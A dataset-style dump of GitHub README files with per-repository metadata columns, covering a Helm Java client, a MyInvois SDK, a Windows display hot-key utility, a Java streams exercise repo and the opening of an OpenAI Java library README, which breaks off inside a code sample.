  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable verbose output
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Version

Similar to [`helm version`](https://helm.sh/docs/helm/helm_version/).

Returns the version of the underlying Helm library.

``` java
String version = Helm.version();
```

## Development

### Project Structure

- Go:
  - `native`: contains the Go project that creates the native c bindings
- Java:
  - `helm-java`: contains the actual Helm Java client library
  - `lib`: contains the Java modules related to the native c binding libraries
    - `api`: contains the API for the native interfaces
    - `darwin-amd64`: contains the Java native access library for darwin/amd64
    - `darwin-arm64`: contains the Java native access library for darwin/arm64
    - `linux-amd64`: contains the Java native access library for linux/amd64
    - `linux-arm64`: contains the Java native access library for linux/arm64
    - `windows-amd64`: contains the Java native access library for windows/amd64

### Release Process

#### Release to Maven Central

To release a new version automatically:

```shell
make release V=X.Y.Z VS=X.Y
```
- `V`: New version to release.
- `VS`: New SNAPSHOT version for Maven.

To release a new version manually:

1. Update the version in the `pom.xml` file.
   ```shell
   mvn versions:set -DnewVersion=X.Y.Z -DgenerateBackupPoms=false
   ```
2. Commit and tag the release with the  `pom.xml` version.
   ```shell
   git add .
   git commit -m ""[RELEASE] vX.Y.Z released""
   git tag vX.Y.Z
   git push origin vX.Y.Z
   ```
3. Update the version in the `pom.xml` file to the next snapshot version.
   ```shell
   mvn versions:set -DnewVersion=X.Y-SNAPSHOT -DgenerateBackupPoms=false
   ```
4. Commit the changes with the following message:
   ```shell
   git add .
   git commit -m ""[RELEASE] v0.0.11 released, prepare for next development iteration""
   git push origin master
   ```

#### Create GitHub Release

Once the release is published to Maven Central, create a new [GitHub release](https://github.com/manusa/helm-java/releases/new) for the released tag.

### License Headers

Whenever a new file is created, the license header must be added. To add the license header to all files:

```shell
make license
```
",12,10,2,apache-2.0,64.0,"['helm', 'client', 'java', 'run', 'helm', 'command', 'directly', 'java', 'client', 'library', 'without', 'need', 'helm', 'cli', 'allows', 'execute', 'helm', 'command', 'directly', 'java', 'without', 'requiring', 'separate', 'helm', 'installation', 'despite', 'still', 'leverage', 'native', 'helm', 'library', 'written', 'go', 'function', 'result', 'expect', 'behavior', 'would', 'get', 'using', 'helm', 'directly', 'getting', 'started', 'add', 'dependency', 'project', 'start', 'using', 'check', 'feature', 'section', 'example', 'documentation', 'feature', 'create', 'equivalent', 'creates', 'chart', 'directory', 'along', 'common', 'file', 'directory', 'used', 'chart', 'dependency', 'equivalent', 'manage', 'chart', 'dependency', 'dependency', 'build', 'equivalent', 'rebuild', 'chart', 'dependency', 'based', 'file', 'dependency', 'list', 'equivalent', 'list', 'dependency', 'given', 'chart', 'dependency', 'update', 'equivalent', 'update', 'chart', 'dependency', 'mirror', 'content', 'install', 'equivalent', 'installs', 'chart', 'archive', 'lint', 'equivalent', 'examine', 'chart', 'possible', 'issue', 'list', 'equivalent', 'list', 'release', 'specified', 'namespace', 'us', 'current', 'namespace', 'context', 'namespace', 'specified', 'package', 'equivalent', 'package', 'chart', 'directory', 'chart', 'archive', 'push', 'equivalent', 'upload', 'chart', 'registry', 'registry', 'equivalent', 'log', 'log', 'registry', 'registry', 'login', 'equivalent', 'log', 'registry', 'registry', 'logout', 'equivalent', 'log', 'registry', 'repo', 'equivalent', 'add', 'list', 'remove', 'update', 'index', 'chart', 'repository', 'repo', 'add', 'equivalent', 'add', 'chart', 'repository', 'repo', 'list', 'equivalent', 'list', 'chart', 'repository', 'repo', 'remove', 'equivalent', 'remove', 'one', 'chart', 'repository', 'repo', 'update', 'equivalent', 'update', 'information', 'available', 'chart', 'locally', 'chart', 'repository', 'search', 'equivalent', 'command', 'provides', 'ability', 'search', 'helm', 'chart', 'various', 'place', 'including', 'artifact', 'hub', 'repository', 'added', 'repo', 'equivalent', 'search', 'repository', 'keyword', 'chart', 'show', 'equivalent', 'show', 'information', 'chart', 'show', 'equivalent', 'show', 'information', 'chart', 'show', 'chart', 'equivalent', 'show', 'chart', 'definition', 'show', 'crds', 'equivalent', 'show', 'chart', 'crds', 'show', 'readme', 'equivalent', 'show', 'chart', 'readme', 'show', 'value', 'equivalent', 'show', 'chart', 'value', 'template', 'equivalent', 'command', 'render', 'chart', 'template', 'locally', 'display', 'output', 'test', 'equivalent', 'command', 'run', 'test', 'release', 'uninstall', 'equivalent', 'command', 'take', 'release', 'name', 'uninstalls', 'release', 'upgrade', 'equivalent', 'upgrade', 'release', 'new', 'version', 'chart', 'version', 'similar', 'returns', 'version', 'underlying', 'helm', 'library', 'development', 'project', 'structure', 'go', 'contains', 'go', 'project', 'creates', 'native', 'c', 'binding', 'java', 'contains', 'actual', 'helm', 'java', 'client', 'library', 'contains', 'java', 'module', 'related', 'native', 'c', 'binding', 'library', 'contains', 'api', 'native', 'interface', 'contains', 'java', 'native', 'access', 'library', 'contains', 'java', 'native', 'access', 'library', 'contains', 'java', 'native', 'access', 'library', 'contains', 'java', 'native', 'access', 'library', 'contains', 'java', 'native', 'access', 'library', 'release', 'process', 'release', 'maven', 'central', 'release', 'new', 'version', 'automatically', 'new', 'version', 'release', 'new', 'snapshot', 'version', 'maven', 'release', 'new', 'version', 'manually', 'update', 'version', 'file', 'commit', 'tag', 'release', 'version', 'update', 'version', 'file', 'next', 'snapshot', 'version', 'commit', 'change', 'following', 'message', 'create', 'github', 'release', 'release', 'published', 'maven', 'central', 'create', 'new', 'github', 'release', 'released', 'tag', 'license', 'header', 'whenever', 'new', 'file', 'created', 'license', 'header', 'must', 'added', 'add', 'license', 'header', 'file']","['equivalent', 'chart', 'release', 'show', 'java']",2,0,0,"['helm', 'client', 'java', 'get', 'start', 'feature', 'create', 'dependency', 'dependency', 'build', 'dependency', 'list', 'dependency', 'update', 'install', 'lint', 'list', 'package', 'push', 'registry', 'registry', 'login', 'registry', 'logout', 'repo', 'repo', 'add', 'repo', 'list', 'repo', 'remove', 'repo', 'update', 'search', 'repo', 'show', 'show', 'show', 'chart', 'show', 'crds', 'show', 'readme', 'show', 'value', 'template', 'test', 'uninstall', 'upgrade', 'version', 'development', 'project', 'structure', 'release', 'process', 'release', 'maven', 'central', 'create', 'github', 'release', 'license', 'header']",40,"['repo', 'show', 'dependency', 'list', 'registry']",34,119.0,8.0,"[maven-jar-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,7.0,1.0,28973,38.12,5.506033578174187,"['`helm create` -> https://helm.sh/docs/helm/helm_create/', '`helm dependency` -> https://helm.sh/docs/helm/helm_dependency/', '`helm dependency build` -> https://helm.sh/docs/helm/helm_dependency_build/', '`helm dependency list` -> https://helm.sh/docs/helm/helm_dependency_list/', '`helm dependency update` -> https://helm.sh/docs/helm/helm_dependency_update/', '`helm install` -> https://helm.sh/docs/helm/helm_install/', '`helm lint` -> https://helm.sh/docs/helm/helm_lint/', '`helm list` -> https://helm.sh/docs/helm/helm_list/', '`helm package` -> https://helm.sh/docs/helm/helm_package/', '`helm push` -> https://helm.sh/docs/helm/helm_push/', '`helm registry` -> https://helm.sh/docs/helm/helm_registry/', '`helm registry login` -> https://helm.sh/docs/helm/helm_registry_login/', '`helm registry logout` -> https://helm.sh/docs/helm/helm_registry_logout/', '`helm repo` -> https://helm.sh/docs/helm/helm_repo/', '`helm repo add` -> https://helm.sh/docs/helm/helm_repo_add/', '`helm repo list` -> https://helm.sh/docs/helm/helm_repo_list/', '`helm repo remove` -> https://helm.sh/docs/helm/helm_repo_remove/', '`helm repo update` -> https://helm.sh/docs/helm/helm_repo_update/', '`helm search` -> https://helm.sh/docs/helm/helm_search/', '`helm search repo` -> https://helm.sh/docs/helm/helm_search_repo/', '`helm show` -> https://helm.sh/docs/helm/helm_show/', '`helm show all` -> https://helm.sh/docs/helm/helm_show_all/', '`helm show chart` -> https://helm.sh/docs/helm/helm_show_chart/', '`helm show crds` -> https://helm.sh/docs/helm/helm_show_crds/', '`helm show readme` -> https://helm.sh/docs/helm/helm_show_readme/', '`helm show values` -> https://helm.sh/docs/helm/helm_show_values/', '`helm template` -> https://helm.sh/docs/helm/helm_template/', '`helm test` -> https://helm.sh/docs/helm/helm_test/', '`helm uninstall` -> https://helm.sh/docs/helm/helm_uninstall/', '`helm upgrade` -> https://helm.sh/docs/helm/helm_upgrade/', '`helm version` -> https://helm.sh/docs/helm/helm_version/', 'GitHub release -> https://github.com/manusa/helm-java/releases/new', 'RELEASE', 'RELEASE']",34
amaseng/myinvois-open-sdk,main,"# myinvois-open-sdk

Open source effort for MyInvois API.

# Disclaimer

While this software is provided under the terms of the Apache License, Version 2.0, it comes with no warranties or guarantees. Users are free to use, modify, and distribute the software according to the terms of the license. However, by using this software, users acknowledge that they do so at their own risk and assume all responsibility for any consequences that may arise from its use.

# Current Status

At the current state support: 

[JVM](jvm/) - Completed, login and validate TIN works, submit document to sandbox with and without signature is working.
",0,0,6,apache-2.0,5.0,"['open', 'source', 'effort', 'myinvois', 'api', 'disclaimer', 'software', 'provided', 'term', 'apache', 'license', 'version', 'come', 'warranty', 'guarantee', 'user', 'free', 'use', 'modify', 'distribute', 'software', 'according', 'term', 'license', 'however', 'using', 'software', 'user', 'acknowledge', 'risk', 'assume', 'responsibility', 'consequence', 'may', 'arise', 'use', 'current', 'status', 'current', 'state', 'support', 'jvm', 'completed', 'login', 'validate', 'tin', 'work', 'submit', 'document', 'sandbox', 'without', 'signature', 'working']","['software', 'term', 'license', 'user', 'use']",0,0,0,"['disclaimer', 'current', 'status']",3,"['disclaimer', 'current', 'status']",0,0.0,1.0,[],0.0,1.0,0.0,635,20.4,4.901960784313726,[],0
jon-mil-92/DisplayHotKeys,main,"<!-- PROJECT LOGO -->

<a name=""readme-top""></a>
<div align=""center"">
  <a href=""https://github.com/jon-mil-92/DisplayHotKeys"">
    <img src=""src/tray_icon.png"" alt=""Logo"" width=""80"" height=""80"" align=""center"" />
  </a>
  <br/>
  <h3 align=""center"">Display Hot Keys</h3>
  <p align=""center"">
    <i>Effortlessly control display settings!</i>
    <br/>
    <a href=""https://github.com/jon-mil-92/DisplayHotKeys/issues"">Report Bug</a>
    <b>·</b>
    <a href=""https://github.com/jon-mil-92/DisplayHotKeys/issues"">Request Feature</a>
    <b>·</b>
    <a href=""https://github.com/jon-mil-92/DisplayHotKeys/releases"">Releases</a>
  </p>
</div>

<!-- TABLE OF CONTENTS -->

## Table of Contents
<ol>
  <li><a href=""#about-the-project"">About The Project</a></li>
  <li><a href=""#getting-started"">Getting Started</a></li>
  <li><a href=""#usage"">Usage</a></li>
  <li><a href=""#roadmap"">Roadmap</a></li>
  <li><a href=""#license"">License</a></li>
  <li><a href=""#contact"">Contact</a></li>
  <li><a href=""#dependencies"">Dependencies</a></li>
</ol>

<!-- ABOUT THE PROJECT -->

## About The Project

This project was created to circumvent the tedious navigation of the Windows settings menus to change display settings. With Display Hot Keys, the display resolution, bit depth, refresh rate, scaling mode, and DPI scale percentage can be changed for each connected display with user-defined hot keys.

### Common Use Cases

* Switch refresh rates to quickly enable the Black Frame Insertion or Backlight Strobing capabilities of the display.

* Quickly switch between resolutions with different aspect ratios.

* Immediately apply a resolution without entering the in-game menus for video game benchmarking purposes.

* Enlarge or shrink the elements on screen by instantly changing the DPI scale percentage.

* Instantly set a display mode while in a video game. (This is useful if a video game does not support changing the resolution or refresh rate while in-game.)

### Example Screen

![screenshot](product-screenshot.png)

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- GETTING STARTED -->

## Getting Started

This application was made only for the Windows platform. Display Hot Keys also uses elevated privileges to set display modes while in video games. Therefore, if you have UAC enabled, you will get a UAC prompt upon launching the application. If you no longer wish to see this prompt, you can [disable UAC]. The sections that follow will help you get the application up and running on your PC!

### Prerequisites

* Windows 10 x64 or Windows 11 x64 operating system.

* If using multiple displays, then the ""Multiple displays"" setting must be set to ""Extend these displays"" in the Windows ""Display"" settings menu!

### Installation

This application will be distributed as a portable package and as an installer.

#### Portable

1. Download the zip archive.

2. Unzip the archive.

3. Double-click the DisplayHotKeys executable file or create a shortcut to run the application.

#### Installer

1. Download the installer.

2. Run the installer.

3. Follow the installer prompts.

4. Double-click the created shortcut or the DisplayHotKeys executable file in the install directory to run the application.

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- USAGE -->

## Usage

This application will launch minimized to the system tray in the task bar by design.

### Setting Hot Keys

1. Click the ""Change Hot Key"" button.

2. Press the key combination for the hot key. (Up to three keys can be used!)

3. Release at least one of the keys to set the hot key.

**Note:** A hot key cannot be a subset of another hot key. For example, you cannot have a hot key of ""Ctrl + F1"" and another hot key of ""Ctrl + Shift + F1"". However, a hot key can be the same as another hot key if they are for different displays. This will allow you to apply display settings for multiple displays with one hot key!

### Changing Displays

1. Click the ""Display"" drop-down box.

2. Select the display you want to change hot keys for.

**Note:** The application will automatically detect newly disconnected and connected displays, and the application will refresh to reflect the display configuration change.

### Changing Active Hot Key Slots

1. Click the ""Slots"" drop-down box.

2. Select one of the values.

**Note:** There can be up to 12 active hot key slots for each connected display.

### Changing Display Orientation

1. Click the ""Orientation"" drop-down box.

2. Select one of the following values:
    
    * Landscape - The standard orientation with no rotation.
    
    * Portrait - Mode for 90 degrees display rotation.
    
    * iLandscape - Inverted landscape mode for 180 degrees display rotation.
    
    * iPortrait - Inverted portrait mode for 270 degrees display rotation.

**Note:** Make sure you can rotate your display before changing the orientation; otherwise, it may be difficult to operate your computer.

### Selecting Display Settings

1. Select a display mode value in the ""Display Mode"" drop-down box for the hot key slot.

2. Select a scaling mode value in the ""Scaling Mode"" drop-down box for the hot key slot.

	* Select ""Preserved"" to preserve the aspect ratio of the image.
	
	* Select ""Stretched"" to stretch the image to the edges of the panel.
	
	* Select ""Centered"" to center the image in the middle of the panel.

3. Select a DPI scale percentage value in the ""DPI Scale"" drop-down box for the hot key slot.

**Note:** You may need to use GPU Scaling in your display driver settings to prevent the monitor from overriding the scaling mode.

### Button Interaction

#### Apply Display Mode

The display settings can be immediately applied by clicking on the ""Apply Display Mode"" button for a hot key slot.

#### Clear Hot Key

Individual hot keys can be cleared by clicking on the ""Clear Hot Key"" button for a hot key slot when a hot key is set.

#### PayPal Donate

If you find the application useful and wish to donate, there is a ""PayPal Donate"" button that will open a PayPal donation web page.

#### Change Theme

The theme can be changed between ""Light Mode"" and ""Dark Mode"" by clicking on the ""Change Theme"" button. The icon will change to indicate the current theme.

#### Run On Startup

The application can start automatically when the user logs into Windows by clicking on the ""Run On Startup"" button. The arrow will turn green to indicate that this option is enabled. The application will start minimized to the system tray.

#### Refresh App

If you have created a custom display mode while the application is running, there is a ""Refresh App"" button that will refresh the application to reflect the new display mode.

#### Clear All Slots

All hot key slots for the selected display can be reset by clicking on the ""Clear All Slots"" button.

#### Minimize To Tray

The application will be minimized to the system tray when the ""Minimize To Tray"" button is pressed. To restore the application, click the system tray icon and select ""Restore"".

#### Exit App

To exit the application, click on the ""Exit App"" button. You can also exit the application from the system tray by clicking on the system tray icon and selecting ""Exit"".

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- ROADMAP -->

## Roadmap

- [x] &thinsp; Release the initial build.
- [x] &thinsp; Add scaling mode selection.
- [x] &thinsp; Add multi-monitor support.
- [x] &thinsp; Add display orientation selection.
- [x] &thinsp; Add button to immediately apply display modes.

See [open issues] for a full list of proposed features (and known issues).

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- LICENSE -->

## License

Distributed under the [MIT License]. See LICENSE.txt for more information.

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- CONTACT -->

## Contact

Jonathan Miller - jonRock1992@gmail.com

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- DEPENDENCIES -->

## Dependencies

* [Java (low-level) System Hook] <b>·</b> [MIT License]

* [FlatLaf - Flat Look and Feel] <b>·</b> [Apache License 2.0]

* [Material Design Icons] <b>·</b> [Apache License 2.0]

* [PayPal Donate Button] <b>·</b> [AGPL License 3.0]

* [SystemTray] <b>·</b> [Apache License 2.0]

* [Ini4j] <b>·</b> [Apache License 2.0]

* [Apache Maven Assembly Plugin] <b>·</b> [Apache License 2.0]

* [Maven Compiler Plugin] <b>·</b> [Apache License 2.0]

Distribution made possible with the following tools:

* [launch4j]

* [Inno Setup]

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- PAYPAL DONATE -->

**Disclaimer:** Development of Display Hot Keys is not contingent on donations. PayPal is a registered trademark of PayPal, Inc. The PayPal logo is a trademark of PayPal, Inc.

<div align=""left"">
  <a href=""https://www.paypal.com/donate/?business=A6U7KG5BDZTRE&no_recurring=0&item_name=I+appreciate+you+visiting+this+page%21+Thank+you%21&currency_code=USD"">
    <img src=""https://raw.githubusercontent.com/stefan-niedermann/paypal-donate-button/master/paypal-donate-button.png"" align=""left"" height=""72""/>
  </a>
</div>
<br/>
<br/>
<br/>

<!-- MARKDOWN LINKS -->

[disable UAC]: https://pureinfotech.com/disable-user-account-control-uac-windows-11/
[open issues]: https://github.com/jon-mil-92/DisplayHotKeys/issues
[Java (low-level) System Hook]: https://github.com/kristian/system-hook
[FlatLaf - Flat Look and Feel]: https://github.com/JFormDesigner/FlatLaf
[Material Design Icons]: https://github.com/marella/material-design-icons
[PayPal Donate Button]: https://github.com/stefan-niedermann/paypal-donate-button
[SystemTray]: https://github.com/dorkbox/SystemTray
[Ini4j]: https://ini4j.sourceforge.net/
[Apache Maven Assembly Plugin]: https://maven.apache.org/plugins/maven-assembly-plugin/index.html
[Maven Compiler Plugin]: https://maven.apache.org/plugins/maven-compiler-plugin/index.html
[launch4j]: https://launch4j.sourceforge.net/index.html
[Inno Setup]: https://jrsoftware.org/isinfo.php
[MIT License]: https://mit-license.org
[Apache License 2.0]: https://www.apache.org/licenses/LICENSE-2.0
[AGPL License 3.0]: https://www.gnu.org/licenses/agpl-3.0.en.html
",8,0,1,mit,0.0,"['table', 'content', 'project', 'project', 'created', 'circumvent', 'tedious', 'navigation', 'window', 'setting', 'menu', 'change', 'display', 'setting', 'display', 'hot', 'key', 'display', 'resolution', 'bit', 'depth', 'refresh', 'rate', 'scaling', 'mode', 'dpi', 'scale', 'percentage', 'changed', 'connected', 'display', 'hot', 'key', 'common', 'use', 'case', 'switch', 'refresh', 'rate', 'quickly', 'enable', 'black', 'frame', 'insertion', 'backlight', 'strobing', 'capability', 'display', 'quickly', 'switch', 'resolution', 'different', 'aspect', 'ratio', 'immediately', 'apply', 'resolution', 'without', 'entering', 'menu', 'video', 'game', 'benchmarking', 'purpose', 'enlarge', 'shrink', 'element', 'screen', 'instantly', 'changing', 'dpi', 'scale', 'percentage', 'instantly', 'set', 'display', 'mode', 'video', 'game', 'useful', 'video', 'game', 'support', 'changing', 'resolution', 'refresh', 'rate', 'example', 'screen', 'getting', 'started', 'application', 'made', 'window', 'platform', 'display', 'hot', 'key', 'also', 'us', 'elevated', 'privilege', 'set', 'display', 'mode', 'video', 'game', 'therefore', 'uac', 'enabled', 'get', 'uac', 'prompt', 'upon', 'launching', 'application', 'longer', 'wish', 'see', 'prompt', 'disable', 'uac', 'section', 'follow', 'help', 'get', 'application', 'running', 'pc', 'prerequisite', 'window', 'window', 'operating', 'system', 'using', 'multiple', 'display', 'multiple', 'display', 'setting', 'must', 'set', 'extend', 'display', 'window', 'display', 'setting', 'menu', 'installation', 'application', 'distributed', 'portable', 'package', 'installer', 'portable', 'download', 'zip', 'archive', 'unzip', 'archive', 'displayhotkeys', 'executable', 'file', 'create', 'shortcut', 'run', 'application', 'installer', 'download', 'installer', 'run', 'installer', 'follow', 'installer', 'prompt', 'created', 'shortcut', 'displayhotkeys', 'executable', 'file', 'install', 'directory', 'run', 'application', 'usage', 'application', 'launch', 'minimized', 'system', 'tray', 'task', 'bar', 'design', 'setting', 'hot', 'key', 'click', 'change', 'hot', 'key', 'button', 'press', 'key', 'combination', 'hot', 'key', 'three', 'key', 'used', 'release', 'least', 'one', 'key', 'set', 'hot', 'key', 'note', 'hot', 'key', 'subset', 'another', 'hot', 'key', 'example', 'hot', 'key', 'ctrl', 'another', 'hot', 'key', 'ctrl', 'shift', 'however', 'hot', 'key', 'another', 'hot', 'key', 'different', 'display', 'allow', 'apply', 'display', 'setting', 'multiple', 'display', 'one', 'hot', 'key', 'changing', 'display', 'click', 'display', 'box', 'select', 'display', 'want', 'change', 'hot', 'key', 'note', 'application', 'automatically', 'detect', 'newly', 'disconnected', 'connected', 'display', 'application', 'refresh', 'reflect', 'display', 'configuration', 'change', 'changing', 'active', 'hot', 'key', 'slot', 'click', 'slot', 'box', 'select', 'one', 'value', 'note', 'active', 'hot', 'key', 'slot', 'connected', 'display', 'changing', 'display', 'orientation', 'click', 'orientation', 'box', 'select', 'one', 'following', 'value', 'landscape', 'standard', 'orientation', 'rotation', 'portrait', 'mode', 'degree', 'display', 'rotation', 'ilandscape', 'inverted', 'landscape', 'mode', 'degree', 'display', 'rotation', 'iportrait', 'inverted', 'portrait', 'mode', 'degree', 'display', 'rotation', 'note', 'make', 'sure', 'rotate', 'display', 'changing', 'orientation', 'otherwise', 'may', 'difficult', 'operate', 'computer', 'selecting', 'display', 'setting', 'select', 'display', 'mode', 'value', 'display', 'mode', 'box', 'hot', 'key', 'slot', 'select', 'scaling', 'mode', 'value', 'scaling', 'mode', 'box', 'hot', 'key', 'slot', 'select', 'preserved', 'preserve', 'aspect', 'ratio', 'image', 'select', 'stretched', 'stretch', 'image', 'edge', 'panel', 'select', 'centered', 'center', 'image', 'middle', 'panel', 'select', 'dpi', 'scale', 'percentage', 'value', 'dpi', 'scale', 'box', 'hot', 'key', 'slot', 'note', 'may', 'need', 'use', 'gpu', 'scaling', 'display', 'driver', 'setting', 'prevent', 'monitor', 'overriding', 'scaling', 'mode', 'button', 'interaction', 'apply', 'display', 'mode', 'display', 'setting', 'immediately', 'applied', 'clicking', 'apply', 'display', 'mode', 'button', 'hot', 'key', 'slot', 'clear', 'hot', 'key', 'individual', 'hot', 'key', 'cleared', 'clicking', 'clear', 'hot', 'key', 'button', 'hot', 'key', 'slot', 'hot', 'key', 'set', 'paypal', 'donate', 'find', 'application', 'useful', 'wish', 'donate', 'paypal', 'donate', 'button', 'open', 'paypal', 'donation', 'web', 'page', 'change', 'theme', 'theme', 'changed', 'light', 'mode', 'dark', 'mode', 'clicking', 'change', 'theme', 'button', 'icon', 'change', 'indicate', 'current', 'theme', 'run', 'startup', 'application', 'start', 'automatically', 'user', 'log', 'window', 'clicking', 'run', 'startup', 'button', 'arrow', 'turn', 'green', 'indicate', 'option', 'enabled', 'application', 'start', 'minimized', 'system', 'tray', 'refresh', 'app', 'created', 'custom', 'display', 'mode', 'application', 'running', 'refresh', 'app', 'button', 'refresh', 'application', 'reflect', 'new', 'display', 'mode', 'clear', 'slot', 'hot', 'key', 'slot', 'selected', 'display', 'reset', 'clicking', 'clear', 'slot', 'button', 'minimize', 'tray', 'application', 'minimized', 'system', 'tray', 'minimize', 'tray', 'button', 'pressed', 'restore', 'application', 'click', 'system', 'tray', 'icon', 'select', 'restore', 'exit', 'app', 'exit', 'application', 'click', 'exit', 'app', 'button', 'also', 'exit', 'application', 'system', 'tray', 'clicking', 'system', 'tray', 'icon', 'selecting', 'exit', 'roadmap', 'x', 'release', 'initial', 'build', 'x', 'add', 'scaling', 'mode', 'selection', 'x', 'add', 'support', 'x', 'add', 'display', 'orientation', 'selection', 'x', 'add', 'button', 'immediately', 'apply', 'display', 'mode', 'see', 'open', 'issue', 'full', 'list', 'proposed', 'feature', 'known', 'issue', 'license', 'distributed', 'mit', 'license', 'see', 'information', 'contact', 'jonathan', 'miller', 'dependency', 'java', 'system', 'hook', 'mit', 'license', 'flatlaf', 'flat', 'look', 'feel', 'apache', 'license', 'material', 'design', 'icon', 'apache', 'license', 'paypal', 'donate', 'button', 'agpl', 'license', 'systemtray', 'apache', 'license', 'apache', 'license', 'apache', 'maven', 'assembly', 'plugin', 'apache', 'license', 'maven', 'compiler', 'plugin', 'apache', 'license', 'distribution', 'made', 'possible', 'following', 'tool', 'inno', 'setup', 'disclaimer', 'development', 'display', 'hot', 'key', 'contingent', 'donation', 'paypal', 'registered', 'trademark', 'paypal', 'inc', 'paypal', 'logo', 'trademark', 'paypal', 'inc']","['display', 'key', 'hot', 'mode', 'application']",2,0,0,"['table', 'content', 'about', 'the', 'project', 'common', 'use', 'case', 'example', 'screen', 'get', 'start', 'prerequisite', 'installation', 'portable', 'installer', 'usage', 'set', 'hot', 'key', 'change', 'display', 'change', 'active', 'hot', 'key', 'slot', 'change', 'display', 'orientation', 'select', 'display', 'setting', 'button', 'interaction', 'apply', 'display', 'mode', 'clear', 'hot', 'key', 'paypal', 'donate', 'change', 'theme', 'run', 'on', 'startup', 'refresh', 'app', 'clear', 'all', 'slot', 'minimize', 'to', 'tray', 'exit', 'app', 'roadmap', 'license', 'contact', 'dependency']",29,"['change', 'display', 'hot', 'key', 'slot']",0,0.0,1.0,"[maven-compiler-plugin,org.apache.maven.plugins:maven-assembly-plugin]",0.0,1.0,0.0,10300,16.760416666666668,4.648850217526414,"['disable UAC', 'x', 'x', 'x', 'x', 'x', 'open issues', 'MIT License', 'MIT License', 'Material Design Icons', 'PayPal Donate Button', 'SystemTray', 'Ini4j', 'Apache Maven Assembly Plugin', 'Maven Compiler Plugin', 'launch4j', 'Inno Setup', 'disable UAC', 'open issues', 'Material Design Icons', 'PayPal Donate Button', 'SystemTray', 'Ini4j', 'Apache Maven Assembly Plugin', 'Maven Compiler Plugin', 'launch4j', 'Inno Setup', 'MIT License']",28
ZahidFKhan/Streams-API-Practices,main,"<h1 align='center'>
Welcome! To STREAM Playground.
</h1>

<p align='center'>
  <a href=""#"">
  <img alt=""GitHub Repo stars"" src=""https://img.shields.io/github/stars/ZahidFKhan/Streams-API-Practices?style=for-the-badge"">
</a>&nbsp;&nbsp;
</p>

## How to use? 🛠️

1. Fork this repository.
2. Remove the `@Disabled` Tags.
3. Solve the Problem.

NOTE: Don't forget to rate this to bookmark.

# Good luck!
",0,0,1,apache-2.0,1.0,"['use', 'fork', 'repository', 'remove', 'tag', 'solve', 'problem', 'note', 'forget', 'rate', 'bookmark', 'good', 'luck']","['use', 'fork', 'repository', 'remove', 'tag']",0,0,0,"['how', 'use', 'good', 'luck']",2,"['how', 'use', 'good', 'luck']",0,95.0,1.0,[org.apache.maven.plugins:maven-surefire-plugin],0.0,1.0,0.0,400,5.818181818181818,4.234375,[],0
Lambdua/openai4j,main,"![Maven Central](https://img.shields.io/maven-central/v/io.github.lambdua/service?color=blue)

# OpenAi4J

OpenAi4J is an unofficial Java library tailored to facilitate the interaction with OpenAI's GPT models, including the
newest additions such as gpt4-turbo vision,assistant-v2. Originally forked from TheoKanning/openai-java, this library
continues development to incorporate latest API features after the original project's maintenance was discontinued.

[中文介绍☕](README-zh.md)

## Features

- Full support for all OpenAI API models including Completions, Chat, Edits, Embeddings, Audio, Files, Assistants-v2,
  Images, Moderations, Batch, and Fine-tuning.
- Easy-to-use client setup with Retrofit for immediate API interaction.
- Extensive examples and documentation to help you start quickly.
- Customizable setup with environment variable integration for API keys and base URLs.
- Supports synchronous and asynchronous API calls.

This library aims to provide Java developers with a robust tool to integrate OpenAI's powerful capabilities into their
applications effortlessly.

# Quick Start

## Import
### Gradle

`implementation 'io.github.lambdua:<api|client|service>:0.22.4'`
### Maven
```xml

<dependency>
  <groupId>io.github.lambdua</groupId>
  <artifactId>service</artifactId>
    <version>0.22.4</version>
</dependency>
```

## chat with OpenAi model

```java
static void simpleChat() {
  //api-key get from environment variable OPENAI_API_KEY
  OpenAiService service = new OpenAiService(Duration.ofSeconds(30));
  List<ChatMessage> messages = new ArrayList<>();
  ChatMessage systemMessage = new SystemMessage(""You are a cute cat and will speak as such."");
  messages.add(systemMessage);
  ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
          .model(""gpt-4o-mini"")
          .messages(messages)
          .n(1)
          .maxTokens(50)
          .build();
  ChatCompletionResult chatCompletion = service.createChatCompletion(chatCompletionRequest);
  System.out.println(chatCompletion.getChoices().get(0).getMessage().getContent());
}
```

# Just Using POJO

If you wish to develop your own client, simply import POJOs from the api module.</br>
Ensure your client adopts snake case naming for compatibility with the OpenAI API.
To utilize pojos, import the api module:

```xml

<dependency>
  <groupId>io.github.lambdua</groupId>
  <artifactId>api</artifactId>
    <version>0.22.4</version>
</dependency>
```

# other examples:

The sample code is all in the `example` package, which includes most of the functional usage. </br>
You can refer to the code in the example package. Below are some commonly used feature usage examples

<details>
<summary>gpt-vision image recognition</summary>

```java
static void gptVision() {
  OpenAiService service = new OpenAiService(Duration.ofSeconds(20));
  final List<ChatMessage> messages = new ArrayList<>();
  final ChatMessage systemMessage = new SystemMessage(""You are a helpful assistant."");
